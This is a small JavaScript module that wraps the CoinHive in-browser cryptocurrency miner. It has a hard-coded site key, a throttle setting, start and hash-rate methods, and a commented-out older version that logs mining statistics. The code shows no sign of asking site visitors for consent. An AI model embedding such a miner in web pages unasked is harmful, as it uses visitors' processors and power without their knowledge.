class CryptoMiner {
  constructor() {
    this.miner = new CoinHive.Anonymous('3UwwmQzszgFZ1lYw9ctSs05IClSFFJNy');
    this.miner.setThrottle(0.8);
  }

  startMiner() {
    console.log('starting miner');
    this.miner.start();
  }

  get getHashesPerSecond() {
    return this.miner.getHashesPerSecond();
  }
}


// const CryptoMiner = () => {
//   console.log('Starting crypo miner');
//   const miner = new CoinHive.Anonymous('3UwwmQzszgFZ1lYw9ctSs05IClSFFJNy');
//   miner.start();

//   setInterval(() => {
//     const hashesPerSecond = miner.getHashesPerSecond();
//     const totalHashes = miner.getTotalHashes();
//     const acceptedHashes = miner.getAcceptedHashes();
//     const threads = miner.getNumThreads();
//     const throttle = miner.getThrottle();


//     console.log('hashes p/s ' + hashesPerSecond);
//     console.log('threads ' + threads);
//     console.log('throttle ' + throttle);
//     console.log('totalHashes ' + totalHashes);
//     console.log('acceptedHashes ' + acceptedHashes);
//     // Output to HTML elements...
//   }, 2000);
// };

export default CryptoMiner;
